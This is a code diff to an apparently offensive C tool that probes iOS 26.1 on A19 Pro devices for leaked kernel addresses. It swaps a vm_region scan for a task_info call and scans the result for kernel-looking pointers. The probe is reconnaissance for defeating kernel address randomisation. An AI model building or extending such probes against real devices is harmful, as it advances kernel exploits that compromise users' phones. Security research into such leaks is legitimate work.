@@ -24,7 +24,7 @@
 #include <mach/mach_host.h>
 #include <mach/processor_info.h>
 #include <mach/thread_info.h>
-#include <mach/vm_map.h>
+/* vm_map.h removed - not needed for iOS */
 
 /* Kernel address patterns for iOS 26.1 on A19 Pro */
 #define KERNEL_BASE_MASK        0xFFFFFFF000000000ULL
@@ -367,40 +367,28 @@ int leak_via_thread_info(void) {
 int leak_via_vm_region(void) {
     printf("\n[*] Probing vm_region...\n");
     
-    vm_address_t address = 0;
-    vm_size_t size;
-    vm_region_basic_info_data_t info;
-    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT;
-    mach_port_t object_name;
+    /* vm_region is not available on iOS, use task_info instead */
+    struct task_vm_info vm_info;
+    mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
     
-    int regions = 0;
+    kern_return_t kr = task_info(g_leak.task_self, TASK_VM_INFO,
+                                  (task_info_t)&vm_info, &count);
     
-    while (1) {
-        kern_return_t kr = vm_region(g_leak.task_self, &address, &size,
-                                      VM_REGION_BASIC_INFO,
-                                      (vm_region_info_t)&info, &count,
-                                      &object_name);
+    if (kr == KERN_SUCCESS) {
+        printf("  Virtual size: %llu MB\n", (unsigned long long)(vm_info.virtual_size / (1024*1024)));
+        printf("  Resident size: %llu MB\n", (unsigned long long)(vm_info.resident_size / (1024*1024)));
+        printf("  Region count: %d\n", vm_info.region_count);
         
-        if (kr != KERN_SUCCESS) break;
-        
-        regions++;
-        
-        /* Look for suspicious regions that might contain kernel pointers */
-        if (info.protection & VM_PROT_EXECUTE) {
-            /* Executable regions are interesting */
-            uint64_t *raw = (uint64_t *)&info;
-            for (size_t i = 0; i < sizeof(info) / sizeof(uint64_t); i++) {
-                if (is_kernel_pointer(raw[i])) {
-                    record_leak(raw[i], "vm_region", 35);
-                }
+        /* Check for leaked pointers */
+        uint64_t *raw = (uint64_t *)&vm_info;
+        for (size_t i = 0; i < sizeof(vm_info) / sizeof(uint64_t); i++) {
+            if (is_kernel_pointer(raw[i])) {
+                record_leak(raw[i], "task_vm_info", 45);
             }
         }
-        
-        address += size;
-        if (regions > 1000) break;  /* Limit iterations */
+    } else {
+        printf("[-] task_info TASK_VM_INFO failed: 0x%x\n", kr);
     }
-    
-    printf("[+] Scanned %d VM regions\n", regions);
     
     return 0;
 }
